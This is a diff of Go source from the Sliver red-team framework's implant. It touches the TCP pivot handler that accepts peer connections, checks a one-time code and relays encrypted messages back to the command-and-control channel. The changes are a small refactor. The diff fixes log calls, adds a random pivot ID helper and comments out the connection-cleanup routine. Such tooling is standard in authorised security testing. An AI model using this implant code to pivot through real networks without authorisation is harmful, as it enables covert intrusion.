@@ -24,7 +24,7 @@ import (
 	"encoding/binary"
 	"fmt"
 	"log"
-	"sync"
+	"math/rand"
 	"time"
 
 	// {{end}}
@@ -34,7 +34,6 @@ import (
 	"github.com/bishopfox/sliver/implant/sliver/cryptography"
 	"github.com/bishopfox/sliver/implant/sliver/transports"
 	"github.com/bishopfox/sliver/protobuf/sliverpb"
-
 	"google.golang.org/protobuf/proto"
 )
 
@@ -63,7 +62,7 @@ func tcpPivotAcceptNewConnection(ln net.Listener) {
 		conn, err := ln.Accept()
 		if err != nil {
 			// {{if .Config.Debug}}
-			log.Println("TCP accept failure: %s", err)
+			log.Printf("tcp accept failure: %s", err)
 			// {{end}}
 			continue
 		}
@@ -82,7 +81,7 @@ func tcpPivotConnectionHandler(conn net.Conn) {
 	if err != nil || n != 8 {
 		conn.Close()
 		// {{if .Config.Debug}}
-		log.Println("Failed to read otp code from peer: %v", err)
+		log.Printf("Failed to read otp code from peer: %v\n", err)
 		// {{end}}
 		return
 	}
@@ -91,45 +90,43 @@ func tcpPivotConnectionHandler(conn net.Conn) {
 	if err != nil || !valid {
 		conn.Close()
 		// {{if .Config.Debug}}
-		log.Println("Invalid otp code from peer %v", err)
+		log.Printf("Invalid otp code from peer %v\n", err)
 		// {{end}}
 		return
 	}
-	cipherCtx := &cryptography.CipherContext{
-		Key:    cryptography.PeerAESKey(otpCode),
-		replay: &sync.Map{},
-	}
+	cipherCtx := cryptography.NewCipherContext(cryptography.PeerAESKey(otpCode))
 	tcpPivotStart(cipherCtx, conn)
 }
 
 func tcpPivotStart(cipherCtx *cryptography.CipherContext, conn net.Conn) {
+	pivotID := pivotID()
 
-	defer func() {
-		// {{if .Config.Debug}}
-		log.Printf("Cleaning up for pivot %d\n", pivotID)
-		// {{end}}
-		conn.Close()
-		pivotClose := &sliverpb.PivotClose{
-			PivotID: pivotID,
-		}
-		data, err := proto.Marshal(pivotClose)
-		if err != nil {
-			// {{if .Config.Debug}}
-			log.Println(err)
-			// {{end}}
-			return
-		}
-		connection := transports.GetActiveConnection()
-		if connection.IsOpen {
-			connection.Send <- &sliverpb.Envelope{
-				Type: sliverpb.MsgPivotClose,
-				Data: data,
-			}
-		}
-	}()
+	// defer func() {
+	// 	// {{if .Config.Debug}}
+	// 	log.Printf("Cleaning up for pivot %d\n", pivotID)
+	// 	// {{end}}
+	// 	conn.Close()
+	// 	pivotClose := &sliverpb.PivotClose{
+	// 		PivotID: pivotID,
+	// 	}
+	// 	data, err := proto.Marshal(pivotClose)
+	// 	if err != nil {
+	// 		// {{if .Config.Debug}}
+	// 		log.Println(err)
+	// 		// {{end}}
+	// 		return
+	// 	}
+	// 	connection := transports.GetActiveConnection()
+	// 	if connection.IsOpen {
+	// 		connection.Send <- &sliverpb.Envelope{
+	// 			Type: sliverpb.MsgPivotClose,
+	// 			Data: data,
+	// 		}
+	// 	}
+	// }()
 
 	for {
-		envelope, err := PivotReadEnvelope(conn)
+		envelope, err := PivotReadEnvelope(cipherCtx, conn)
 		if err != nil {
 			// {{if .Config.Debug}}
 			log.Println(err)
@@ -167,4 +164,10 @@ func tcpPivotStart(cipherCtx *cryptography.CipherContext, conn net.Conn) {
 			}
 		}
 	}
+}
+
+func pivotID() uint32 {
+	buf := make([]byte, 4)
+	rand.Read(buf)
+	return binary.LittleEndian.Uint32(buf)
 }
